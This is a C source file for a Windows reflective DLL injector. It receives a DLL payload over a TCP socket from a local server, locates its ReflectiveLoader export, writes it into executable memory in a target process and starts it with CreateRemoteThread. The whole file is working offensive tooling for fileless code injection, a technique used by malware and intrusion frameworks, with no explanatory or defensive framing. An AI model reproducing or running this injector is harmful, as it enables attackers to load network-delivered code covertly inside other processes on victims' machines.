#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include "reflective_loader.h"

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;
	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders -> FileHeader.SizeOfOptionalHeader);
	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;
	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
	{
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva <
			(pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress +
				pSectionHeader[wIndex].PointerToRawData);
	}
	return 0;
}

DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer)
{
	UINT_PTR uiBaseAddress = 0;
	UINT_PTR uiExportDir = 0;
	UINT_PTR uiNameArray = 0;
	UINT_PTR uiAddressArray = 0;
	UINT_PTR uiNameOrdinals = 0;
	DWORD dwCounter = 0;
	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
	uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir) -> OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress,
		uiBaseAddress);
	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames,
		uiBaseAddress);
	uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir) -> AddressOfFunctions, uiBaseAddress);
	uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir) -> AddressOfNameOrdinals, uiBaseAddress);
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;
	while (dwCounter--)
	{
		char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray),
			uiBaseAddress));
		if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL)
		{
			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir) -> AddressOfFunctions, uiBaseAddress);
			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));
			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
		}

		uiNameArray += sizeof(DWORD);
		uiNameOrdinals += sizeof(WORD);
	}
	return 0;
}

HANDLE WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
{
	BOOL bSuccess = FALSE;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	DWORD dwThreadId = 0;
	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
	if (!dwReflectiveLoaderOffset)
		return hThread;
	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);
	if (!lpRemoteLibraryBuffer)
		return hThread;
	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
		return hThread;

	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer +
		dwReflectiveLoaderOffset);

	hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter,
		(DWORD)NULL, &dwThreadId);
	return hThread;
}

typedef int(__stdcall* f_funci)();

int main(int argc, char** argv)
{
	HANDLE hTargetProcess = NULL;
	HANDLE hModule = NULL;
	DWORD dwBytesRead = 0;
	DWORD dwTargetProcessID = NULL;
	if (argc < 2)
	{
		ERROR("Wrong usage. Try: Injector.exe <name of target process>");
		return 0;
	}
	dwTargetProcessID = atoi(argv[INDEX_TARGET_PROCESS_ID]);
	if (!dwTargetProcessID) {
		ERROR("Could not find target process, maybe it is not running");
		return 0;
	}

	// Initialize Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		// Handle initialization error
		return 1;
	}

	// Create socket
	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET) {
		// Handle socket creation error
		return 1;
	}

	// Connect to the server
	struct sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(2843);
	serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
		// Handle connection error
		closesocket(clientSocket);
		WSACleanup();
		return 1;
	}

	// Receive data from the server and store in a buffer
	char receivedBuffer[12288]; // Adjust the size according to your DLL size
	int bytesReceived = recv(clientSocket, receivedBuffer, sizeof(receivedBuffer), 0);
	if (bytesReceived == SOCKET_ERROR) {
		// Handle receive error
		closesocket(clientSocket);
		WSACleanup();
		return 1;
	}

	// Clean up
	closesocket(clientSocket);
	WSACleanup();

	// Now you have the received DLL data in the receivedBuffer

	// Create an LPVOID variable and copy the received data
	LPVOID lpBuffer = malloc(bytesReceived); // Allocate memory for the LPVOID buffer
	memcpy(lpBuffer, receivedBuffer, bytesReceived); // Copy received data to lpBuffer

	unsigned char* byteData = (unsigned char*)lpBuffer;
	for (int i = 0; i < bytesReceived; ++i) {
		printf("%02X ", byteData[i]);
		if ((i + 1) % 16 == 0)
			printf("\n");
	}
	printf("\n");
	
	hTargetProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwTargetProcessID);
	if (!hTargetProcess)
		ERROR_WITH_CODE("Failed to open the target process");

	hModule = LoadRemoteLibraryR(hTargetProcess, lpBuffer, bytesReceived, NULL);
	if (!hModule)
		ERROR_WITH_CODE("Failed to inject the DLL");
	printf("[+] Injected the DLL into process %d.", dwTargetProcessID);

	// Don't forget to free lpBuffer when done using it
	free(lpBuffer);

	WaitForSingleObject(hModule, -1);
	return 1;
}